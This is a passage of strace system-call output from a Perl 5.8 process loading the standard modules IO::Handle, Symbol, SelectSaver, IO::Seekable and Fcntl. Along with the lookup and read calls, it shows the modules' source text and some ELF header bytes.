it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
8458  07:23:31.475956 stat64("/etc/perl/Symbol.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476002 stat64("/etc/perl/Symbol.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476046 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476059 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476073 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476086 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476100 stat64("/usr/lib/perl5/Symbol.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476112 stat64("/usr/lib/perl5/Symbol.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476126 stat64("/usr/share/perl5/Symbol.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476137 stat64("/usr/share/perl5/Symbol.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476151 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476163 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476177 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476189 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
8458  07:23:31.476211 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.476225 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.476237 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.476255 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
8458  07:23:31.476667 read(8,  <unfinished ...>
8456  07:23:31.476688 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8456  07:23:31.476711 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8456  07:23:31.476725 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8456  07:23:31.476737 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
8456  07:23:31.476749 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
8456  07:23:31.476763 waitpid(-1,  <unfinished ...>
8458  07:23:31.476773 <... read resumed> "", 4096) = 0
8458  07:23:31.476781 close(8)          = 0
8458  07:23:31.476846 stat64("/etc/perl/SelectSaver.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476863 stat64("/etc/perl/SelectSaver.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476877 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476891 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476905 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476918 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476945 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.476988 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.477003 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.477031 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.477044 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.477057 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.477072 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.477085 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
8458  07:23:31.477107 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.477122 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.477134 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.477153 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
8458  07:23:31.477282 brk(0x81d6000)    = 0x81d6000
8458  07:23:31.477313 read(8, "", 4096) = 0
8458  07:23:31.477324 close(8)          = 0
8458  07:23:31.477744 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
8458  07:23:31.478369 read(6, "", 4096) = 0
8458  07:23:31.478386 close(6)          = 0
8458  07:23:31.478425 stat64("/etc/perl/IO/Seekable.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478455 stat64("/etc/perl/IO/Seekable.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478469 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478483 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478497 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478510 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478525 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478537 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478554 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478568 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478581 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.478594 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
8458  07:23:31.478616 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.478632 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.478644 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.478663 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
8458  07:23:31.478794 stat64("/etc/perl/Fcntl.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482823 stat64("/etc/perl/Fcntl.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482823 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482824 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482824 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482824 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482824 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482824 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482825 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482825 stat64("/usr/share/perl5/Fcntl.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482825 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.482825 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
8458  07:23:31.482826 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.482826 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.482826 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.482826 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
8458  07:23:31.483476 brk(0x81f7000)    = 0x81f7000
8458  07:23:31.483751 read(8, "", 4096) = 0
8458  07:23:31.483766 close(8)          = 0
8458  07:23:31.483838 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8458  07:23:31.492439 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8458  07:23:31.492486 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
8458  07:23:31.492501 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
8458  07:23:31.492594 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8458  07:23:31.492612 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d1d000
8458  07:23:31.492626 mmap2(0xb7d20000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d20000
8458  07:23:31.492642 close(8)          = 0
8458  07:23:31.492850 read(6, "", 4096) = 0
8458  07:23:31.492865 close(6)          = 0
